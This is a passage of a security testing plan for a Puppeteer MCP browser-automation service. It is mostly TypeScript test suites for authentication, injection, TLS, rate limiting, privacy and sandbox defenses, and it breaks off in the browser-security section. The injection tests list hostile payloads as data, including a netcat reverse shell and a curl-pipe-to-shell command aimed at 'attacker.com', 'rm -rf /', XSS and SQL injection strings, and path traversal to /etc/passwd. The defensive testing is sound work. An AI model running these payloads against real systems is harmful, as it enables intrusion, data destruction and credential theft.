# Comprehensive Security Testing Strategy for Puppeteer MCP

## Executive Summary

This document outlines a comprehensive security testing strategy for the Puppeteer MCP project,
covering all critical security domains with specific test scenarios, tools integration, automated
testing approaches, and continuous monitoring strategies.

## Table of Contents

1. [Authentication & Authorization Testing](#1-authentication--authorization-testing)
2. [Input Validation & Injection Testing](#2-input-validation--injection-testing)
3. [Network Security Testing](#3-network-security-testing)
4. [Data Protection & Privacy](#4-data-protection--privacy)
5. [Browser Security Testing](#5-browser-security-testing)
6. [Compliance & Audit Testing](#6-compliance--audit-testing)
7. [Security Tools Integration](#7-security-tools-integration)
8. [Automated Security Testing](#8-automated-security-testing)
9. [Continuous Security Monitoring](#9-continuous-security-monitoring)
10. [Implementation Roadmap](#10-implementation-roadmap)

## 1. Authentication & Authorization Testing

### 1.1 JWT Token Validation and Expiration

#### Test Scenarios

```typescript
// tests/security/auth/jwt-validation.test.ts
describe('JWT Security Tests', () => {
  test('should reject expired tokens', async () => {
    const expiredToken = generateToken({ exp: Date.now() / 1000 - 3600 });
    const response = await request(app)
      .get('/api/sessions')
      .set('Authorization', `Bearer ${expiredToken}`);
    expect(response.status).toBe(401);
    expect(response.body.error).toContain('Token expired');
  });

  test('should reject tokens with invalid signature', async () => {
    const tamperedToken = validToken.slice(0, -10) + 'tampered';
    const response = await request(app)
      .get('/api/sessions')
      .set('Authorization', `Bearer ${tamperedToken}`);
    expect(response.status).toBe(401);
  });

  test('should enforce token rotation', async () => {
    const oldToken = await auth.generateToken(user);
    await auth.rotateTokens();
    const response = await request(app)
      .get('/api/sessions')
      .set('Authorization', `Bearer ${oldToken}`);
    expect(response.status).toBe(401);
  });

  test('should validate token claims', async () => {
    const tokenWithInvalidClaims = generateToken({
      sub: 'user123',
      aud: 'wrong-audience',
      iss: 'wrong-issuer',
    });
    const response = await request(app)
      .get('/api/sessions')
      .set('Authorization', `Bearer ${tokenWithInvalidClaims}`);
    expect(response.status).toBe(401);
  });
});
```

#### Specific Attack Vectors

- Token replay attacks
- Clock skew exploitation
- Algorithm confusion attacks
- Key confusion attacks
- None algorithm attacks

### 1.2 API Key Security and Rotation

#### Test Scenarios

```typescript
// tests/security/auth/api-key-security.test.ts
describe('API Key Security Tests', () => {
  test('should prevent timing attacks on API key validation', async () => {
    const validKey = 'pmcp_validkey123';
    const invalidKey = 'pmcp_invalidkey';

    const timings = [];
    for (let i = 0; i < 1000; i++) {
      const start = process.hrtime.bigint();
      await auth.validateApiKey(i % 2 === 0 ? validKey : invalidKey);
      const end = process.hrtime.bigint();
      timings.push(Number(end - start));
    }

    // Statistical analysis to ensure constant time comparison
    const variance = calculateVariance(timings);
    expect(variance).toBeLessThan(threshold);
  });

  test('should enforce API key rotation policy', async () => {
    const oldKey = await apiKeyService.generate('test-key');
    await advanceTime(91 * 24 * 60 * 60 * 1000); // 91 days

    const response = await request(app).get('/api/sessions').set('X-API-Key', oldKey.key);

    expect(response.status).toBe(401);
    expect(response.body.error).toContain('Key rotation required');
  });

  test('should detect and prevent API key enumeration', async () => {
    const attempts = [];
    for (let i = 0; i < 100; i++) {
      const response = await request(app)
        .get('/api/sessions')
        .set('X-API-Key', `pmcp_${randomBytes(32).toString('hex')}`);
      attempts.push(response);
    }

    // Should rate limit after threshold
    const blockedResponses = attempts.filter((r) => r.status === 429);
    expect(blockedResponses.length).toBeGreaterThan(0);
  });
});
```

### 1.3 Session Hijacking Prevention

#### Test Scenarios

```typescript
// tests/security/auth/session-hijacking.test.ts
describe('Session Hijacking Prevention', () => {
  test('should detect session token reuse from different IP', async () => {
    const session = await auth.createSession(user, '192.168.1.1');

    const response = await request(app)
      .get('/api/sessions/current')
      .set('Authorization', `Bearer ${session.token}`)
      .set('X-Forwarded-For', '10.0.0.1');

    expect(response.status).toBe(401);
    expect(response.body.error).toContain('Session security violation');
  });

  test('should detect session fingerprint changes', async () => {
    const session = await auth.createSession(user, {
      userAgent: 'Mozilla/5.0 (Windows NT 10.0)',
      acceptLanguage: 'en-US',
    });

    const response = await request(app)
      .get('/api/sessions/current')
      .set('Authorization', `Bearer ${session.token}`)
      .set('User-Agent', 'Mozilla/5.0 (Macintosh)');

    expect(response.status).toBe(401);
  });

  test('should implement session fixation protection', async () => {
    const preAuthSession = await request(app).get('/api/auth/init');
    const sessionId = preAuthSession.body.sessionId;

    await request(app).post('/api/auth/login').send({ username: 'user', password: 'pass' });

    const response = await request(app)
      .get('/api/sessions/current')
      .set('Cookie', `sessionId=${sessionId}`);

    expect(response.status).toBe(401);
  });
});
```

### 1.4 Privilege Escalation Testing

#### Test Scenarios

```typescript
// tests/security/auth/privilege-escalation.test.ts
describe('Privilege Escalation Tests', () => {
  test('should prevent horizontal privilege escalation', async () => {
    const user1Token = await auth.login('user1', 'pass1');
    const user2SessionId = 'session-user2-123';

    const response = await request(app)
      .delete(`/api/sessions/${user2SessionId}`)
      .set('Authorization', `Bearer ${user1Token}`);

    expect(response.status).toBe(403);
  });

  test('should prevent vertical privilege escalation', async () => {
    const userToken = await auth.login('regular-user', 'pass');

    const response = await request(app)
      .post('/api/admin/users')
      .set('Authorization', `Bearer ${userToken}`)
      .send({ role: 'admin' });

    expect(response.status).toBe(403);
  });

  test('should prevent JWT claim manipulation', async () => {
    const userToken = await auth.login('user', 'pass');
    const decoded = jwt.decode(userToken);
    decoded.roles = ['admin'];
    const manipulatedToken = jwt.sign(decoded, 'wrong-secret');

    const response = await request(app)
      .get('/api/admin/users')
      .set('Authorization', `Bearer ${manipulatedToken}`);

    expect(response.status).toBe(401);
  });
});
```

### 1.5 Multi-User Isolation Verification

#### Test Scenarios

```typescript
// tests/security/auth/multi-user-isolation.test.ts
describe('Multi-User Isolation Tests', () => {
  test('should isolate browser sessions between users', async () => {
    const user1 = await createUser('user1');
    const user2 = await createUser('user2');

    const session1 = await browserService.createSession(user1);
    const session2 = await browserService.createSession(user2);

    // Set cookie in user1's session
    await session1.page.evaluate(() => {
      document.cookie = 'secret=user1-data';
    });

    // Try to read from user2's session
    const cookies = await session2.page.evaluate(() => document.cookie);
    expect(cookies).not.toContain('user1-data');
  });

  test('should prevent cross-session data leakage', async () => {
    const user1Session = await createAuthenticatedSession('user1');
    const user2Session = await createAuthenticatedSession('user2');

    // User1 stores sensitive data
    await request(app)
      .post('/api/sessions/data')
      .set('Authorization', `Bearer ${user1Session.token}`)
      .send({ sensitive: 'user1-secret' });

    // User2 tries to access user1's data
    const response = await request(app)
      .get('/api/sessions/data')
      .set('Authorization', `Bearer ${user2Session.token}`);

    expect(response.body).not.toContain('user1-secret');
  });
});
```

## 2. Input Validation & Injection Testing

### 2.1 XSS Prevention in Evaluate Commands

#### Test Scenarios

```typescript
// tests/security/injection/xss-prevention.test.ts
describe('XSS Prevention Tests', () => {
  const xssPayloads = [
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror="alert(1)">',
    'javascript:alert(1)',
    '<svg onload=alert(1)>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}', // Template injection
  ];

  xssPayloads.forEach((payload) => {
    test(`should prevent XSS: ${payload.substring(0, 30)}...`, async () => {
      const response = await request(app).post('/api/browser/evaluate').send({
        sessionId: validSession.id,
        script: payload,
      });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('dangerous pattern detected');
    });
  });

  test('should sanitize DOM manipulation', async () => {
    const response = await request(app)
      .post('/api/browser/evaluate')
      .send({
        sessionId: validSession.id,
        script: `
          const div = document.createElement('div');
          div.innerHTML = userInput; // Should be blocked
        `,
      });

    expect(response.status).toBe(400);
  });

  test('should prevent stored XSS', async () => {
    // Store malicious payload
    await request(app).post('/api/sessions/data').send({
      name: '<script>alert(1)</script>',
    });

    // Retrieve and verify sanitization
    const response = await request(app).get('/api/sessions/data');

    expect(response.body.name).not.toContain('<script>');
    expect(response.body.name).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
  });
});
```

### 2.2 SQL Injection Testing

#### Test Scenarios

```typescript
// tests/security/injection/sql-injection.test.ts
describe('SQL Injection Prevention', () => {
  const sqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE sessions; --",
    "' UNION SELECT * FROM users --",
    "' OR 1=1 --",
    "admin'--",
    "' OR '1'='1' /*",
    "' OR ''='",
    "' OR 1=1#",
    "' OR 1=1 LIMIT 1 --",
    "' OR 'x'='x",
    "\\'; DROP TABLE sessions; --",
    "1' AND '1'='1",
    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
  ];

  sqlPayloads.forEach((payload) => {
    test(`should prevent SQL injection: ${payload}`, async () => {
      const response = await request(app).get('/api/sessions').query({ search: payload });

      // Should return valid response, not SQL error
      expect(response.status).not.toBe(500);
      expect(response.body).not.toMatch(/SQL/i);
      expect(response.body).not.toMatch(/syntax error/i);
    });
  });

  test('should use parameterized queries', async () => {
    const maliciousId = "'; DELETE FROM sessions WHERE '1'='1";

    const response = await request(app).get(`/api/sessions/${encodeURIComponent(maliciousId)}`);

    expect(response.status).toBe(404); // Not found, not SQL error
  });

  test('should prevent second-order SQL injection', async () => {
    // Store malicious payload
    await request(app).post('/api/users/profile').send({
      bio: "'; DROP TABLE sessions; --",
    });

    // Trigger second-order injection
    const response = await request(app).get('/api/users/search');

    expect(response.status).toBe(200);

    // Verify sessions table still exists
    const sessionsResponse = await request(app).get('/api/sessions');
    expect(sessionsResponse.status).toBe(200);
  });
});
```

### 2.3 Command Injection Testing

#### Test Scenarios

```typescript
// tests/security/injection/command-injection.test.ts
describe('Command Injection Prevention', () => {
  const commandPayloads = [
    '; ls -la',
    '| cat /etc/passwd',
    '`whoami`',
    '$(whoami)',
    '&& rm -rf /',
    '; nc -e /bin/sh attacker.com 4444',
    '\n/bin/sh',
    '| curl attacker.com/shell.sh | sh',
    '; python -c "import os; os.system(\'ls\')"',
    '& ping -c 10 attacker.com &',
  ];

  commandPayloads.forEach((payload) => {
    test(`should prevent command injection: ${payload}`, async () => {
      const response = await request(app)
        .post('/api/browser/screenshot')
        .send({
          sessionId: validSession.id,
          filename: `screenshot${payload}.png`,
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Invalid filename');
    });
  });

  test('should sanitize process arguments', async () => {
    const response = await request(app)
      .post('/api/browser/pdf')
      .send({
        sessionId: validSession.id,
        options: {
          headerTemplate: '<h1>Title</h1>"; rm -rf /; echo "',
        },
      });

    // Should either sanitize or reject
    expect([200, 400]).toContain(response.status);
    if (response.status === 200) {
      // Verify command wasn't executed
      expect(fs.existsSync('/')).toBe(true);
    }
  });
});
```

### 2.4 Path Traversal Testing

#### Test Scenarios

```typescript
// tests/security/injection/path-traversal.test.ts
describe('Path Traversal Prevention', () => {
  const pathPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '..%252f..%252f..%252fetc/passwd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
    '/var/www/../../etc/passwd',
    'C:\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '\\\\server\\share\\..\\..\\sensitive',
    'file:///etc/passwd',
    '..%00/etc/passwd',
  ];

  pathPayloads.forEach((payload) => {
    test(`should prevent path traversal: ${payload}`, async () => {
      const response = await request(app).get('/api/files/download').query({ path: payload });

      expect(response.status).toBe(400);
      expect(response.body.error).toMatch(/invalid path|forbidden/i);
    });
  });

  test('should validate file paths in uploads', async () => {
    const response = await request(app)
      .post('/api/files/upload')
      .field('path', '../../../etc/passwd')
      .attach('file', Buffer.from('malicious content'), 'evil.txt');

    expect(response.status).toBe(400);
  });

  test('should prevent symlink attacks', async () => {
    // Create symlink to sensitive file
    const tempDir = await fs.mkdtemp('/tmp/test-');
    const symlink = path.join(tempDir, 'link');
    await fs.symlink('/etc/passwd', symlink);

    const response = await request(app).get('/api/files/read').query({ path: symlink });

    expect(response.status).toBe(403);
  });
});
```

### 2.5 Buffer Overflow Testing

#### Test Scenarios

```typescript
// tests/security/injection/buffer-overflow.test.ts
describe('Buffer Overflow Prevention', () => {
  test('should handle extremely long inputs', async () => {
    const longString = 'A'.repeat(10_000_000); // 10MB string

    const response = await request(app).post('/api/browser/evaluate').send({
      sessionId: validSession.id,
      script: longString,
    });

    expect(response.status).toBe(413); // Payload too large
  });

  test('should limit array sizes', async () => {
    const hugeArray = new Array(1_000_000).fill('data');

    const response = await request(app).post('/api/browser/cookies').send({
      sessionId: validSession.id,
      cookies: hugeArray,
    });

    expect(response.status).toBe(400);
    expect(response.body.error).toContain('Too many cookies');
  });

  test('should prevent integer overflow', async () => {
    const response = await request(app)
      .post('/api/browser/viewport')
      .send({
        sessionId: validSession.id,
        width: Number.MAX_SAFE_INTEGER + 1,
        height: 1080,
      });

    expect(response.status).toBe(400);
    expect(response.body.error).toContain('Invalid viewport dimensions');
  });

  test('should handle deeply nested objects', async () => {
    let deepObject = { data: 'value' };
    for (let i = 0; i < 10000; i++) {
      deepObject = { nested: deepObject };
    }

    const response = await request(app).post('/api/sessions/data').send(deepObject);

    expect(response.status).toBe(400);
    expect(response.body.error).toContain('Object too deeply nested');
  });
});
```

## 3. Network Security Testing

### 3.1 HTTPS/TLS Configuration Validation

#### Test Scenarios

```typescript
// tests/security/network/tls-configuration.test.ts
describe('TLS Configuration Tests', () => {
  test('should only accept TLS 1.2 and above', async () => {
    const client = tls.connect({
      port: 8443,
      host: 'localhost',
      secureProtocol: 'TLSv1_1_method',
    });

    await expect(
      new Promise((resolve, reject) => {
        client.on('error', reject);
        client.on('secureConnect', resolve);
      }),
    ).rejects.toThrow(/unsupported protocol/i);
  });

  test('should use strong cipher suites only', async () => {
    const client = tls.connect({
      port: 8443,
      host: 'localhost',
      ciphers: 'DES-CBC3-SHA', // Weak cipher
    });

    await expect(
      new Promise((resolve, reject) => {
        client.on('error', reject);
        client.on('secureConnect', resolve);
      }),
    ).rejects.toThrow();
  });

  test('should enforce HSTS headers', async () => {
    const response = await request(app).get('/');

    expect(response.headers['strict-transport-security']).toBe(
      'max-age=31536000; includeSubDomains; preload',
    );
  });

  test('should implement certificate pinning', async () => {
    const fakeCert = generateFakeCertificate();

    const response = await request(app).get('/api/health').ca(fakeCert);

    await expect(response).rejects.toThrow(/certificate verification failed/i);
  });
});
```

### 3.2 Certificate Management Testing

#### Test Scenarios

```typescript
// tests/security/network/certificate-management.test.ts
describe('Certificate Management Tests', () => {
  test('should detect expired certificates', async () => {
    const expiredCert = generateExpiredCertificate();

    await expect(
      makeSecureRequest('https://localhost:8443', { cert: expiredCert }),
    ).rejects.toThrow(/certificate has expired/i);
  });

  test('should validate certificate chain', async () => {
    const selfSignedCert = generateSelfSignedCertificate();

    await expect(
      makeSecureRequest('https://localhost:8443', { cert: selfSignedCert }),
    ).rejects.toThrow(/self signed certificate/i);
  });

  test('should check certificate revocation', async () => {
    const revokedCert = getRevokedCertificate();

    await expect(
      makeSecureRequest('https://localhost:8443', { cert: revokedCert }),
    ).rejects.toThrow(/certificate revoked/i);
  });

  test('should rotate certificates before expiry', async () => {
    const certInfo = await getCertificateInfo('https://localhost:8443');
    const daysUntilExpiry = Math.floor((certInfo.validTo - Date.now()) / (1000 * 60 * 60 * 24));

    expect(daysUntilExpiry).toBeGreaterThan(30); // At least 30 days
  });
});
```

### 3.3 Man-in-the-Middle Attack Prevention

#### Test Scenarios

```typescript
// tests/security/network/mitm-prevention.test.ts
describe('MITM Attack Prevention', () => {
  test('should detect DNS spoofing attempts', async () => {
    // Mock DNS resolution to malicious IP
    mockDNS.resolve('api.example.com', '192.168.1.100');

    const response = await request(app).post('/api/browser/navigate').send({
      sessionId: validSession.id,
      url: 'https://api.example.com',
    });

    expect(response.status).toBe(400);
    expect(response.body.error).toContain('DNS validation failed');
  });

  test('should prevent protocol downgrade attacks', async () => {
    const response = await request(app).get('/api/health').redirects(0);

    // Should not redirect to HTTP
    expect(response.status).not.toBe(301);
    expect(response.headers.location).not.toMatch(/^http:/);
  });

  test('should implement mutual TLS for sensitive endpoints', async () => {
    const response = await request(app).get('/api/admin/config').cert(null); // No client certificate

    expect(response.status).toBe(401);
    expect(response.body.error).toContain('Client certificate required');
  });
});
```

### 3.4 DoS/DDoS Resistance Testing

#### Test Scenarios

```typescript
// tests/security/network/dos-resistance.test.ts
describe('DoS/DDoS Resistance Tests', () => {
  test('should rate limit requests per IP', async () => {
    const requests = [];
    for (let i = 0; i < 200; i++) {
      requests.push(request(app).get('/api/sessions').set('X-Forwarded-For', '192.168.1.100'));
    }

    const responses = await Promise.all(requests);
    const rateLimited = responses.filter((r) => r.status === 429);

    expect(rateLimited.length).toBeGreaterThan(0);
    expect(rateLimited[0].headers['retry-after']).toBeDefined();
  });

  test('should prevent slowloris attacks', async () => {
    const slowClient = net.connect({ port: 8080, host: 'localhost' });

    // Send partial HTTP request very slowly
    slowClient.write('GET / HTTP/1.1\r\n');
    await sleep(1000);
    slowClient.write('Host: localhost\r\n');
    await sleep(1000);

    // Connection should be closed by server
    await expect(
      new Promise((resolve, reject) => {
        slowClient.on('close', resolve);
        slowClient.on('error', reject);
        setTimeout(reject, 30000);
      }),
    ).resolves.toBeUndefined();
  });

  test('should limit concurrent connections per IP', async () => {
    const connections = [];
    for (let i = 0; i < 100; i++) {
      connections.push(createPersistentConnection('192.168.1.100'));
    }

    const results = await Promise.allSettled(connections);
    const rejected = results.filter((r) => r.status === 'rejected');

    expect(rejected.length).toBeGreaterThan(0);
  });

  test('should implement SYN flood protection', async () => {
    const synFloodTest = await runSynFloodTest({
      target: 'localhost:8080',
      duration: 5000,
      rate: 10000,
    });

    expect(synFloodTest.successfulConnections).toBeGreaterThan(0);
    expect(synFloodTest.availability).toBeGreaterThan(0.8); // 80% availability
  });
});
```

### 3.5 Rate Limiting Effectiveness

#### Test Scenarios

```typescript
// tests/security/network/rate-limiting.test.ts
describe('Rate Limiting Tests', () => {
  test('should implement sliding window rate limiting', async () => {
    const results = [];

    // First burst
    for (let i = 0; i < 50; i++) {
      results.push(await request(app).get('/api/sessions'));
    }

    await sleep(5000); // Wait 5 seconds

    // Second burst
    for (let i = 0; i < 50; i++) {
      results.push(await request(app).get('/api/sessions'));
    }

    const blocked = results.filter((r) => r.status === 429);
    expect(blocked.length).toBeGreaterThan(0);
  });

  test('should rate limit by user account', async () => {
    const userToken = await auth.login('testuser', 'password');
    const requests = [];

    for (let i = 0; i < 1000; i++) {
      requests.push(
        request(app)
          .post('/api/browser/evaluate')
          .set('Authorization', `Bearer ${userToken}`)
          .send({ script: '1+1' }),
      );
    }

    const responses = await Promise.all(requests);
    const rateLimited = responses.filter((r) => r.status === 429);

    expect(rateLimited.length).toBeGreaterThan(0);
    expect(rateLimited[0].body.error).toContain('rate limit exceeded');
  });

  test('should implement cost-based rate limiting', async () => {
    const expensiveOps = [
      { endpoint: '/api/browser/screenshot', cost: 10 },
      { endpoint: '/api/browser/pdf', cost: 20 },
      { endpoint: '/api/browser/evaluate', cost: 5 },
    ];

    let totalCost = 0;
    const responses = [];

    for (const op of expensiveOps) {
      const response = await request(app).post(op.endpoint).send({ sessionId: validSession.id });

      responses.push(response);
      totalCost += op.cost;

      if (response.status === 429) {
        expect(totalCost).toBeGreaterThanOrEqual(100); // Cost threshold
        break;
      }
    }
  });
});
```

## 4. Data Protection & Privacy

### 4.1 Session Data Isolation

#### Test Scenarios

```typescript
// tests/security/privacy/session-isolation.test.ts
describe('Session Data Isolation Tests', () => {
  test('should isolate localStorage between sessions', async () => {
    const session1 = await browserService.createSession(user1);
    const session2 = await browserService.createSession(user2);

    // Set data in session 1
    await session1.page.evaluate(() => {
      localStorage.setItem('secret', 'user1-secret-data');
    });

    // Try to read from session 2
    const data = await session2.page.evaluate(() => {
      return localStorage.getItem('secret');
    });

    expect(data).toBeNull();
  });

  test('should isolate cookies between sessions', async () => {
    const session1 = await browserService.createSession(user1);
    const session2 = await browserService.createSession(user2);

    // Set cookie in session 1
    await session1.page.setCookie({
      name: 'session',
      value: 'user1-session-id',
      domain: '.example.com',
    });

    // Get cookies from session 2
    const cookies = await session2.page.cookies('.example.com');

    expect(cookies).not.toContainEqual(expect.objectContaining({ value: 'user1-session-id' }));
  });

  test('should prevent cross-context data access', async () => {
    const context1 = await browser.createIncognitoBrowserContext();
    const context2 = await browser.createIncognitoBrowserContext();

    const page1 = await context1.newPage();
    const page2 = await context2.newPage();

    // Store data in context 1
    await page1.goto('https://example.com');
    await page1.evaluate(() => {
      window.secretData = 'context1-secret';
    });

    // Try to access from context 2
    await page2.goto('https://example.com');
    const leaked = await page2.evaluate(() => window.secretData);

    expect(leaked).toBeUndefined();
  });
});
```

### 4.2 PII Handling in Browser Content

#### Test Scenarios

```typescript
// tests/security/privacy/pii-handling.test.ts
describe('PII Handling Tests', () => {
  const piiPatterns = [
    { type: 'SSN', pattern: /\d{3}-\d{2}-\d{4}/, example: '123-45-6789' },
    {
      type: 'Credit Card',
      pattern: /\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}/,
      example: '4111 1111 1111 1111',
    },
    { type: 'Email', pattern: /[\w.-]+@[\w.-]+\.\w+/, example: 'user@example.com' },
    {
      type: 'Phone',
      pattern: /\+?\d{1,3}[\s-]?\(?\d{3}\)?[\s-]?\d{3}[\s-]?\d{4}/,
      example: '+1 (555) 123-4567',
    },
  ];

  piiPatterns.forEach(({ type, pattern, example }) => {
    test(`should redact ${type} in screenshots`, async () => {
      // Create page with PII
      await session.page.setContent(`
        <html><body>
          <p>Sensitive: ${example}</p>
        </body></html>
      `);

      const screenshot = await request(app)
        .post('/api/browser/screenshot')
        .send({ sessionId: session.id, redactPII: true });

      // Analyze screenshot for PII
      const text = await extractTextFromImage(screenshot.body);
      expect(text).not.toMatch(pattern);
      expect(text).toContain('*'.repeat(example.length));
    });
  });

  test('should sanitize PII in logs', async () => {
    const logSpy = jest.spyOn(logger, 'info');

    await request(app).post('/api/browser/evaluate').send({
      sessionId: session.id,
      script: 'console.log("SSN: 123-45-6789")',
    });

    const logCalls = logSpy.mock.calls;
    const hasPII = logCalls.some((call) =>
      call.some((arg) => /123-45-6789/.test(JSON.stringify(arg))),
    );

    expect(hasPII).toBe(false);
  });

  test('should encrypt PII in session storage', async () => {
    const sensitiveData = {
      ssn: '123-45-6789',
      creditCard: '4111111111111111',
      email: 'user@example.com',
    };

    await request(app).post('/api/sessions/data').send({ sensitive: sensitiveData });

    // Direct database access
    const stored = await db.query('SELECT data FROM session_data WHERE session_id = ?', [
      session.id,
    ]);

    // Data should be encrypted
    expect(stored[0].data).not.toContain('123-45-6789');
    expect(stored[0].data).toMatch(/^encrypted:/);
  });
});
```

### 4.3 Secure Storage of Credentials

#### Test Scenarios

```typescript
// tests/security/privacy/credential-storage.test.ts
describe('Credential Storage Security', () => {
  test('should encrypt API keys at rest', async () => {
    const apiKey = await apiKeyService.generate('test-key', ['read']);

    // Check database storage
    const stored = await db.query('SELECT key_hash FROM api_keys WHERE id = ?', [apiKey.id]);

    expect(stored[0].key_hash).not.toBe(apiKey.key);
    expect(stored[0].key_hash).toMatch(/^\$2[aby]\$\d{2}\$/); // bcrypt format
  });

  test('should use secure key derivation', async () => {
    const password = 'user-password';
    const hash1 = await auth.hashPassword(password);
    const hash2 = await auth.hashPassword(password);

    // Different salts should produce different hashes
    expect(hash1).not.toBe(hash2);

    // Both should verify correctly
    expect(await auth.verifyPassword(password, hash1)).toBe(true);
    expect(await auth.verifyPassword(password, hash2)).toBe(true);
  });

  test('should securely wipe sensitive data from memory', async () => {
    const sensitiveBuffer = Buffer.from('sensitive-api-key');
    const reference = Buffer.from(sensitiveBuffer);

    await crypto.secureWipe(sensitiveBuffer);

    // Original buffer should be zeroed
    expect(sensitiveBuffer.every((byte) => byte === 0)).toBe(true);
    expect(sensitiveBuffer).not.toEqual(reference);
  });

  test('should rotate encryption keys', async () => {
    const data = 'sensitive-data';
    const encrypted1 = await crypto.encrypt(data);

    await crypto.rotateKeys();

    const encrypted2 = await crypto.encrypt(data);

    // Different ciphertexts after rotation
    expect(encrypted1).not.toBe(encrypted2);

    // Both should still decrypt correctly
    expect(await crypto.decrypt(encrypted1)).toBe(data);
    expect(await crypto.decrypt(encrypted2)).toBe(data);
  });
});
```

### 4.4 Data Encryption at Rest and in Transit

#### Test Scenarios

```typescript
// tests/security/privacy/data-encryption.test.ts
describe('Data Encryption Tests', () => {
  test('should encrypt session data at rest', async () => {
    const sessionData = {
      browserContext: 'context-123',
      cookies: [{ name: 'session', value: 'secret' }],
      localStorage: { token: 'auth-token' },
    };

    await sessionStore.save(session.id, sessionData);

    // Read raw from disk
    const rawData = await fs.readFile(`/sessions/${session.id}.dat`);
    const content = rawData.toString();

    expect(content).not.toContain('secret');
    expect(content).not.toContain('auth-token');
    expect(content).toMatch(/^AES256-GCM:/);
  });

  test('should use TLS for all API communications', async () => {
    const endpoints = ['/api/sessions', '/api/browser/evaluate', '/api/auth/login', '/ws'];

    for (const endpoint of endpoints) {
      const response = await request(`http://localhost:8080${endpoint}`).get().redirects(0);

      // Should redirect to HTTPS
      expect(response.status).toBe(301);
      expect(response.headers.location).toMatch(/^https:/);
    }
  });

  test('should encrypt sensitive fields in database', async () => {
    const user = await userService.create({
      email: 'test@example.com',
      ssn: '123-45-6789',
      creditCard: '4111111111111111',
    });

    const rawUser = await db.query('SELECT * FROM users WHERE id = ?', [user.id]);

    expect(rawUser[0].email).toBe('test@example.com'); // Not sensitive
    expect(rawUser[0].ssn).not.toBe('123-45-6789'); // Encrypted
    expect(rawUser[0].credit_card).not.toBe('4111111111111111'); // Encrypted
  });
});
```

### 4.5 GDPR Compliance Validation

#### Test Scenarios

```typescript
// tests/security/privacy/gdpr-compliance.test.ts
describe('GDPR Compliance Tests', () => {
  test('should implement right to access (data portability)', async () => {
    const response = await request(app)
      .get('/api/gdpr/export')
      .set('Authorization', `Bearer ${userToken}`);

    expect(response.status).toBe(200);
    expect(response.headers['content-type']).toBe('application/json');

    const data = response.body;
    expect(data).toHaveProperty('profile');
    expect(data).toHaveProperty('sessions');
    expect(data).toHaveProperty('activityLog');
    expect(data).not.toHaveProperty('internalIds'); // No internal data
  });

  test('should implement right to erasure', async () => {
    const userId = 'user-123';

    const response = await request(app)
      .delete('/api/gdpr/delete-me')
      .set('Authorization', `Bearer ${userToken}`);

    expect(response.status).toBe(200);

    // Verify deletion
    const userData = await db.query('SELECT * FROM users WHERE id = ?', [userId]);
    expect(userData).toHaveLength(0);

    // Verify anonymization of logs
    const logs = await db.query('SELECT * FROM audit_logs WHERE user_id = ?', [userId]);
    expect(logs).toHaveLength(0);
  });

  test('should track consent and allow withdrawal', async () => {
    // Give consent
    await request(app).post('/api/gdpr/consent').send({
      purpose: 'analytics',
      granted: true,
    });

    // Withdraw consent
    const response = await request(app).post('/api/gdpr/consent').send({
      purpose: 'analytics',
      granted: false,
    });

    expect(response.status).toBe(200);

    // Verify analytics are disabled
    const settings = await request(app).get('/api/user/settings');
    expect(settings.body.analytics.enabled).toBe(false);
  });

  test('should enforce data retention policies', async () => {
    // Create old data
    const oldDate = new Date();
    oldDate.setDate(oldDate.getDate() - 91); // 91 days old

    await db.query('INSERT INTO sessions (id, user_id, created_at) VALUES (?, ?, ?)', [
      'old-session',
      'user-123',
      oldDate,
    ]);

    // Run retention job
    await dataRetentionJob.run();

    // Verify deletion
    const sessions = await db.query('SELECT * FROM sessions WHERE id = ?', ['old-session']);
    expect(sessions).toHaveLength(0);
  });
});
```

## 5. Browser Security Testing

### 5.1 Sandbox Escape Prevention

#### Test Scenarios

```typescript
// tests/security/browser/sandbox-escape.test.ts
describe('Sandbox Escape Prevention', () => {
  test('should prevent access to Node.js APIs', async () => {
    const attempts = [
      'process.exit()',
      'require("fs").readFileSync("/etc/passwd")',
      'require("child_process").exec("whoami")',
      '__dirname',
      'global.process.env',
      'require.resolve("fs")',
    ];

    for (const attempt of attempts) {
      const response = await request(app).post('/api/browser/evaluate').send({
        sessionId: session.id,
        script: attempt,
      });

      expect([400, 500]).toContain(response.status);
      if (response.status === 500) {
        expect(response.body.error).toMatch(/not defined|Cannot read|prohibited/);
      }
    }
  });

  test('should prevent chrome DevTools protocol abuse', async () => {
    const maliciousCommands = [
      { method: 'Browser.close' },
      { method: 'Browser.setDownloadBehavior', params: { behavior: 'allow', downloadPath: '/' } },
      { method: 'FileSystem.requestFileSystem', params: { origin: 'file:///' } },
      { method: 'Target.createTarget', params: { url: 'file:///etc/passwd' } },
    ];

    for (const command of maliciousCommands) {
      const response = await request(app).post('/api/browser/cdp').send({
        sessionId: session.id,
        command,
      });

      expect(response.status).toBe(403);
      expect(response.body.error).toContain('CDP command not allowed');
    }
  });

  test('should isolate browser processes', async () => {
    const session1 = await browserService.createSession(user1);
    const session2 = await browserService.createSession(user2);

    // Get process info
    const pid1 = await session1.page.evaluate(() => {
      // Try to get process info (should fail)
      try {
        return process.pid;
      } catch {
        return 'isolated';
      }
    });

    const pid2 = await session2.page.evaluate(() => {
      try {
        return process.pid;
      } catch {
        return 'isolated';
      }
    });

    expect(pid1).toBe('isolated');
    expect(pid2).toBe('isolated');
  });
});
```

### 5.2 Malicious Site Interaction

#### Test Scenarios

```typescript
// tests/security/browser/malicious-sites.test.ts
describe('Malicious Site Protection', () => {
  test('should block known malicious domains', async () => {
    const maliciousDomains = [
      'malware-test.example.com',
      'phishing-test.example.com',
      'cryptojacking.example.com',
    ];

    for (const domain of maliciousDomains) {
      const response = await request(app)
        .post('/api/browser/navigate')
        .send({
